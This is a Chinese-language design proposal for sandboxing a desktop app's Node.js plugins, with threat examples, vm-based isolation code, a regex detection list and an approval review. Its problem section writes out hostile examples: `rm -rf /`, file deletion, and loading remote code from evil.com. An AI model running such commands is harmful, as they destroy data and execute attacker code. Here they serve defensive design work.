# 插件沙箱安全加固

## Change ID
`plugin-sandbox-security`

## Status
**APPROVED** ✅

**审查日期**: 2025-01-15
**审查结果**: 批准实施,需补充性能基准测试
**优先级**: P0 (核心安全功能)

## Overview

创建插件沙箱环境,防止插件绕过权限系统直接访问系统资源,确保所有操作都经过安全检查。

## Problem Statement

### 当前安全问题

#### 1. **插件可以直接访问 Node.js 模块** 🔴 严重

插件代码可以直接 `require` Node.js 内置模块,绕过所有安全控制:

```javascript
// 插件代码可以这样写:
const { exec } = require('child_process')
const fs = require('fs')

// 直接执行命令,无需权限检查!
exec('rm -rf /')
fs.unlinkSync('/important/file')
```

#### 2. **绕过权限系统** 🔴 严重

即使插件没有请求相应权限,也可以直接访问系统资源:

```javascript
// package.json 中声明权限:
"permissions": ["fs:read"]  // 只有读取权限

// 但插件可以这样做:
const fs = require('fs')
fs.writeFile('/path/to/file', data)  // 写入操作!绕过权限检查!
```

#### 3. **绕过审计日志** 🟡 中等

通过插件 API 执行的操作会被记录,但直接调用 Node.js 模块不会:

```javascript
// ✅ 通过 API - 有日志
await this.context.api.process.exec('ls')

// ❌ 直接调用 - 无日志
const { exec } = require('child_process')
exec('ls')  // 没有审计记录!
```

#### 4. **执行任意代码** 🔴 严重

插件可以动态加载和执行任意代码:

```javascript
// 动态加载恶意模块
const evil = require('http://evil.com/malware.js')

// 使用 eval 执行代码
eval('malicious code')

// 使用 Function 构造器
new Function('return malicious code')()
```

#### 5. **真实案例**

微信多实例插件原本直接使用 `child_process.exec`:
- ❌ 绕过了权限检查
- ❌ 绕过了执行指示器
- ❌ 没有审计日志
- ✅ 修复后使用 `context.api.process.exec()`
  - 所有操作都经过权限检查
  - 触发执行指示器
  - 有完整的审计日志

### 安全风险总结

| 风险 | 严重性 | 当前状态 | 影响 |
|------|--------|----------|------|
| 直接访问 Node.js 模块 | 🔴 严重 | ❌ 未防护 | 完全绕过权限系统 |
| 绕过权限检查 | 🔴 严重 | ❌ 未防护 | 可以执行未授权操作 |
| 绕过审计日志 | 🟡 中等 | ❌ 未防护 | 无法追踪恶意行为 |
| 执行任意代码 | 🔴 严重 | ❌ 未防护 | 可以注入恶意代码 |
| 访问敏感数据 | 🔴 严重 | ❌ 未防护 | 可以读取用户文件 |

### 为什么需要沙箱?

1. **用户信任**: 用户需要信任插件不会做坏事
2. **权限系统有效**: 权限系统必须有强制力,不能靠"自觉"
3. **审计完整性**: 所有敏感操作都应该被记录
4. **合规要求**: 某些场景需要满足安全合规标准

## Solution Overview

### 核心策略

**在插件运行时强制使用沙箱环境,限制其可访问的模块和功能。**

### 解决方案架构

```
┌─────────────────────────────────────────────────────────┐
│                    主进程 (Main Process)                  │
│                                                           │
│  ┌───────────────────────────────────────────────────┐  │
│  │            插件沙箱 (Plugin Sandbox)              │  │
│  │                                                    │  │
│  │  ┌──────────────────────────────────────────────┐ │  │
│  │  │  vm.Module (隔离的模块上下文)                 │ │  │
│  │  │                                               │ │  │
│  │  │  ✅ 允许:                                    │ │  │
│  │  │  - context (插件上下文,包含 API)             │ │  │
│  │  │  - exports (导出接口)                        │ │  │
│  │  │  - module (模块信息)                         │ │  │
│  │  │  - __dirname, __filename (路径信息)          │ │  │
│  │  │                                               │ │  │
│  │  │  ❌ 禁止:                                    │ │  │
│  │  │  - require (加载模块)                        │ │  │
│  │  │  - process (进程信息)                        │ │  │
│  │  │  - global (全局对象)                         │ │  │
│  │  │  - Buffer (敏感操作)                         │ │  │
│  │  │  - 所有 Node.js 内置模块                     │ │  │
│  │  └──────────────────────────────────────────────┘ │  │
│  │                                                    │  │
│  │  ┌──────────────────────────────────────────────┐ │  │
│  │  │  运行时代理 (Runtime Proxy)                  │ │  │
│  │  │                                               │ │  │
│  │  │  - 拦截 eval() 调用                          │ │  │
│  │  │  - 拦截 Function() 构造器                    │ │  │
│  │  │  - 拦截动态 import()                         │ │  │
│  │  └──────────────────────────────────────────────┘ │  │
│  │                                                    │  │
│  └───────────────────────────────────────────────────┘  │
│                                                           │
│  ┌───────────────────────────────────────────────────┐  │
│  │         权限系统 (Permission System)              │  │
│  │                                                    │  │
│  │  所有系统访问都必须经过:                           │  │
│  │  - context.api.fs.*                               │  │
│  │  - context.api.process.*                          │  │
│  │  - context.api.clipboard.*                        │  │
│  │  - context.api.notification.*                     │  │
│  │  - context.api.config.*                           │  │
│  │  - context.api.transaction.*                      │  │
│  └───────────────────────────────────────────────────┘  │
│                                                           │
└───────────────────────────────────────────────────────────┘
```

### 关键技术点

#### 1. **使用 Node.js VM 模块创建隔离上下文**

```javascript
const vm = require('vm')

// 创建安全的沙箱上下文
const sandbox = {
  context: pluginContext,  // 只暴露插件 API
  exports: {},             // 插件导出
  module: { exports: {} },
  __dirname: pluginDir,
  __filename: pluginMainFile,
  console: console         // 允许日志输出
}

// 不暴露 require, process, global 等
// 插件只能使用 context.api 访问系统资源

const script = new vm.Script(pluginCode, {
  filename: pluginMainFile
})

script.runInNewContext(sandbox, {
  timeout: 30000,  // 防止无限循环
  displayErrors: true
})
```

#### 2. **代理拦截危险操作**

```javascript
// 拦截 eval
const safeEval = new Proxy(eval, {
  apply(target, thisArg, args) {
    throw new Error('eval is not allowed in plugins')
  }
})

sandbox.eval = safeEval

// 拦截 Function 构造器
sandbox.Function = new Proxy(Function, {
  construct(target, args) {
    throw new Error('Function constructor is not allowed in plugins')
  }
})
```

#### 3. **静态代码分析**

在加载插件前检查源代码:

```javascript
// 检查是否包含危险模式
const dangerousPatterns = [
  /require\s*\(/,           // 直接 require
  /process\./,              // 访问 process
  /child_process/,          // 加载子进程模块
  /eval\s*\(/,              // eval 调用
  /new\s+Function\s*\(/,    // Function 构造器
  /import\s*\(/,            // 动态 import
]

function validatePluginCode(code) {
  for (const pattern of dangerousPatterns) {
    if (pattern.test(code)) {
      throw new Error(
        `Plugin contains forbidden pattern: ${pattern}`
      )
    }
  }
}
```

#### 4. **白名单机制**

只允许访问明确的 API:

```javascript
const allowedAPIs = {
  fs: ['readFile', 'writeFile', 'readDir', 'stat'],
  process: ['exec', 'spawn', 'kill'],
  clipboard: ['readText', 'writeText'],
  // ...
}

// 任何不在白名单的操作都会被拒绝
```

## Implementation Plan

### Phase 1: 基础沙箱 (P0 - 必需)

**目标**: 防止插件直接访问 Node.js 模块

**实现**:
1. 使用 `vm.runInNewContext()` 创建隔离环境
2. 移除 `require`, `process`, `global` 等全局对象
3. 只暴露 `context` (插件 API) 和基本 JavaScript 对象
4. 添加静态代码检查,拒绝包含危险模式的插件

**验证**:
- 插件无法 `require('fs')`
- 插件无法访问 `process.env`
- 插件只能使用 `context.api.*` 访问系统资源

### Phase 2: 运行时保护 (P1 - 重要)

**目标**: 防止插件通过动态方式绕过限制

**实现**:
1. 拦截 `eval()` 调用
2. 拦截 `Function()` 构造器
3. 拦截动态 `import()`
4. 添加超时保护,防止无限循环

**验证**:
- `eval('code')` 抛出错误
- `new Function('code')` 抛出错误
- 尝试动态加载模块失败

### Phase 3: 增强监控 (P2 - 增强)

**目标**: 提供完整的审计和安全监控

**实现**:
1. 记录所有插件 API 调用
2. 检测异常行为模式
3. 提供安全事件仪表板
4. 生成安全审计报告

**验证**:
- 所有操作都有日志记录
- 可以查看插件行为历史
- 检测到可疑行为时告警

### Phase 4: 插件认证 (P3 - 可选)

**目标**: 建立插件信任机制

**实现**:
1. 插件代码签名验证
2. 插件来源白名单
3. 插件评分系统
4. 社区审核机制

**验证**:
- 未签名插件显示警告
- 只允许安装来自信任来源的插件
- 显示插件安全评分

## Compatibility & Migration

### 向后兼容性

**影响**: 需要修改现有插件代码

**兼容性策略**:
1. **第一阶段**: 提供警告模式
   - 检测到危险的 `require` 调用时记录警告
   - 仍然允许插件运行
   - 提示开发者迁移到插件 API

2. **第二阶段**: 强制沙箱模式
   - 完全启用沙箱限制
   - 不符合规范的插件无法加载
   - 提供详细的错误信息

3. **迁移工具**: 提供自动迁移脚本
   ```javascript
   // 自动替换常见模式
   require('fs').readFileSync → context.api.fs.readFile
   require('child_process').exec → context.api.process.exec
   ```

### 现有插件迁移

**需要更新的插件**:
- ✅ `wechat-multi-instance`: 已更新
- 📋 其他插件需要检查和更新

**迁移指南**:

| 原代码 | 新代码 |
|--------|--------|
| `require('fs/promises')` | `context.api.fs` |
| `require('child_process')` | `context.api.process` |
| `process.env.HOME` | 从配置读取或使用 API |
| `__dirname` | 仍然可用(沙箱内) |
| `Buffer` | 使用字符串或通过 API |

## Success Criteria

### 安全性指标

- ✅ 100% 的插件无法绕过权限系统
- ✅ 100% 的系统访问都经过权限检查
- ✅ 100% 的敏感操作都有审计日志
- ✅ 0 个插件可以执行未授权的文件操作
- ✅ 0 个插件可以执行未授权的进程操作

### 功能性指标

- ✅ 所有合规插件正常工作
- ✅ 插件加载性能不受影响(< 1秒)
- ✅ 内存使用增加 < 20%
- ✅ 开发者能够快速理解错误信息

### 用户体验指标

- ✅ 用户看到插件安全状态
- ✅ 用户可以授权/撤销权限
- ✅ 用户可以查看插件行为日志
- ✅ 未授权操作被拦截时有清晰提示

## Alternatives Considered

### 方案 A: 依赖开发者自觉 (当前方案)

**优点**:
- 无需额外实现
- 完全灵活性

**缺点**:
- ❌ 没有任何安全保障
- ❌ 恶意插件可以为所欲为
- ❌ 无法通过安全审计

**结论**: ❌ 不可接受

### 方案 B: 使用隔离的 Worker 线程

**优点**:
- 真正的操作系统级隔离
- 崩溃不影响主进程

**缺点**:
- 实现复杂度高
- 性能开销大(序列化/反序列化)
- 难以调试

**结论**: ⚠️ 过度设计,VM 沙箱已足够

### 方案 C: 使用第三方沙箱库

**优点**:
- 成熟的解决方案
- 可能更安全

**缺点**:
- 引入外部依赖
- 可能不满足特定需求
- 需要评估和审查

**结论**: ⚠️ 可选,先使用 Node.js 原生 VM

### 方案 D: VM 沙箱 (推荐方案)

**优点**:
- ✅ 使用 Node.js 内置功能
- ✅ 实现相对简单
- ✅ 性能开销可控
- ✅ 足够的安全性

**缺点**:
- 不是完美的隔离(VM 逃逸可能)
- 需要仔细设计和测试

**结论**: ✅ 最佳平衡

## Risks & Mitigations

### 风险 1: VM 逃逸攻击

**描述**: 攻击者利用 VM 漏洞逃逸沙箱

**严重性**: 🔴 高

**缓解措施**:
1. 保持 Node.js 版本更新
2. 监控安全公告
3. 多层防御(VM + 静态检查 + 运行时监控)
4. 限制插件执行时间

### 风险 2: 合规插件无法加载

**描述**: 沙箱过于严格,导致正常插件无法工作

**严重性**: 🟡 中

**缓解措施**:
1. 充分测试现有插件
2. 提供详细的错误信息
3. 允许开发者请求豁免(需要审核)
4. 提供沙箱外模式(仅开发环境)

### 风险 3: 性能下降

**描述**: 沙箱检查导致插件变慢

**严重性**: 🟡 中

**缓解措施**:
1. 优化静态检查(缓存结果)
2. 最小化运行时开销
3. 性能测试和优化
4. 提供性能监控工具

### 风险 4: 开发者抵触

**描述**: 开发者不愿意迁移代码

**严重性**: 🟢 低

**缓解措施**:
1. 提供清晰的迁移指南
2. 提供自动迁移工具
3. 给予足够的过渡时间
4. 强调安全好处

## Dependencies

### 技术依赖

- ✅ Node.js VM 模块 (内置)
- ✅ 权限系统 (已实现)
- ✅ 插件 API (已实现)

### 功能依赖

- **Phase 1** 无依赖,可独立实施
- **Phase 2** 依赖 Phase 1
- **Phase 3** 依赖 Phase 1 和 2
- **Phase 4** 可独立实施

### 相关改动

- 与 `plugin-execution-indicator` 变更配合:
  - 沙箱确保所有操作触发指示器
  - 指示器帮助用户了解插件行为

- 与 `transactional-permissions` 变更配合:
  - 沙箱强制权限检查
  - 权限系统提供细粒度控制

## Rollout Plan

### 阶段 1: 警告模式 (1-2 周)

**目标**: 让开发者了解即将的变化

**行动**:
1. 在加载插件时检查危险模式
2. 记录警告日志
3. 在开发者工具中显示警告
4. 发布迁移指南

### 阶段 2: 测试模式 (2-3 周)

**目标**: 在开发环境测试沙箱

**行动**:
1. 在开发模式启用沙箱
2. 收集反馈和问题
3. 修复发现的问题
4. 更新文档和示例

### 阶段 3: 生产模式 (1 周)

**目标**: 在生产环境启用沙箱

**行动**:
1. 逐步推出(先小部分用户)
2. 监控错误和性能
3. 快速响应问题
4. 全量推出

---

## 审查结果

### 审查评分: ⭐⭐⭐⭐ (4.3/5.0)

#### 优点

1. **问题识别准确** ⭐⭐⭐⭐⭐
   - 真实案例支撑 (微信多实例插件)
   - 严重性评估合理
   - 影响分析全面

2. **解决方案设计优秀** ⭐⭐⭐⭐⭐
   - 技术路线正确 (Node.js VM)
   - 架构清晰 (4个核心组件)
   - 多层防御策略
   - 充分的替代方案对比

3. **实施计划可行** ⭐⭐⭐⭐
   - 分阶段实施合理
   - 时间估算准确 (6-10周)
   - 迁移策略完善

4. **文档完整** ⭐⭐⭐⭐⭐
   - proposal.md (700+行)
   - tasks.md (44个任务)
   - design.md (800+行)
   - spec.md (21个场景)

#### 需要补充的内容

1. **性能基准测试** (必须)
   - 提案中说"5-10%性能下降",但没有基准数据
   - 需要在 Phase 1 前完成:
     - 插件加载时间对比
     - API 调用延迟对比
     - 内存使用对比

2. **VM 沙箱局限性说明** (强烈建议)
   - 已知的逃逸向量
   - 不是完美的隔离
   - 缓解措施已足够

3. **开发体验支持** (重要)
   - 开发模式下可禁用沙箱
   - 详细的错误信息
   - IDE 集成工具

4. **兼容性检查清单** (必须)
   - 对所有现有插件运行静态检查
   - 识别需要迁移的插件
   - 制定每个插件的迁移计划

### 批准条件

**批准实施**,但需要在 Phase 1 开始前完成:

1. ✅ **性能基准测试** (1周)
   - 测试当前插件加载时间
   - 测试当前 API 调用延迟
   - 建立性能基线

2. ✅ **兼容性检查** (1周)
   - 对所有插件运行静态检查
   - 识别违规代码
   - 创建迁移清单

3. ✅ **开发模式设计** (3天)
   - 设计环境变量控制
   - 实现调试友好的错误信息
   - 更新开发文档

**总计准备时间**: 2-3周

### 实施优先级

**Phase 1: 基础沙箱** - **P0 (必需)**
- 防止插件绕过权限系统
- 立即提升安全性
- 是其他阶段的基础

**Phase 2: 运行时保护** - **P1 (重要)**
- 防止动态代码执行
- 进一步加固安全
- 与 Phase 1 紧密配合

**Phase 4: 文档迁移** - **P1 (重要)**
- 确保开发者能顺利迁移
- 减少迁移阻力
- 可与 Phase 2 并行

**Phase 3: 增强监控** - **P2 (增强)**
- 提供审计能力
- 检测异常行为
- 可延后实施

### 下一步行动

#### 立即行动 (本周内)

1. **创建性能基准**
   ```bash
   # 测试当前插件加载性能
   npm run benchmark:plugin-load

   # 测试 API 调用性能
   npm run benchmark:api-call
   ```

2. **静态检查所有插件**
   ```bash
   # 运行静态检查工具
   npm run lint:plugins --security

   # 生成检查报告
   npm run report:plugins --security
   ```

3. **设计开发模式**
   - 确定环境变量名称
   - 设计警告/错误信息格式
   - 更新开发文档

#### Phase 1 准备 (2-3周内)

1. **创建原型**
   - 实现 PluginSandbox 类
   - 实现 PluginValidator 类
   - 编写单元测试

2. **验证方案**
   - 用微信插件测试沙箱
   - 测试性能影响
   - 验证错误信息

3. **准备迁移**
   - 创建迁移工具
   - 编写迁移指南
   - 更新示例插件

#### 启动实施 (准备完成后)

1. **创建开发分支**
   ```bash
   git checkout -b feature/plugin-sandbox-security
   git push -u origin feature/plugin-sandbox-security
   ```

2. **设置里程碑**
   - Week 1-2: 性能基准和兼容性检查
   - Week 3-5: Phase 1 实施
   - Week 6-7: Phase 2 实施
   - Week 8-10: Phase 4 实施和测试

3. **定期审查**
   - 每周进度会议
   - 代码审查
   - 性能监控

### 成功标准

Phase 1 成功的标准:
- ✅ 所有插件无法绕过权限系统
- ✅ 微信插件正常工作
- ✅ 插件加载时间增加 < 20%
- ✅ 内存使用增加 < 20%
- ✅ 0个安全漏洞

### 风险监控

**关键指标**:
- 插件加载失败率 < 1%
- 插件功能回归 = 0
- 性能下降 < 20%
- 安全漏洞 = 0

**应对措施**:
- 如果加载失败率 > 1%,启用警告模式
- 如果性能下降 > 30%,优化沙箱实现
- 如果发现严重问题,准备回滚方案

---

**批准人**: Claude (AI Assistant)
**批准日期**: 2025-01-15
**下次审查**: Phase 1 完成后

### 阶段 4: 强化阶段 (持续)

**目标**: 持续改进安全性

**行动**:
1. 添加更多检查
2. 改进错误信息
3. 优化性能
4. 定期安全审计

## Open Questions

### Q1: 是否允许插件使用 npm 包?

**选项**:
- A. 完全禁止 (最安全)
- B. 允许但需要审查 (平衡)
- C. 白名单机制 (灵活)

**建议**: 先实施 A,根据需求考虑 B 或 C

### Q2: 如何处理需要特殊权限的插件?

**选项**:
- A. 拒绝所有特殊需求
- B. 手动审核和豁免
- C. 用户明确授权

**建议**: C (用户授权 + 风险提示)

### Q3: 是否提供沙箱调试模式?

**选项**:
- A. 不提供 (保持简单)
- B. 开发环境可禁用 (便于调试)
- C. 提供详细日志 (平衡)

**建议**: C (详细日志比完全禁用更好)

## Next Steps

1. **审查提案**: 讨论技术方案和优先级
2. **创建设计文档**: 详细的技术设计
3. **制定任务清单**: 具体的实施步骤
4. **开始 Phase 1**: 实现基础沙箱功能
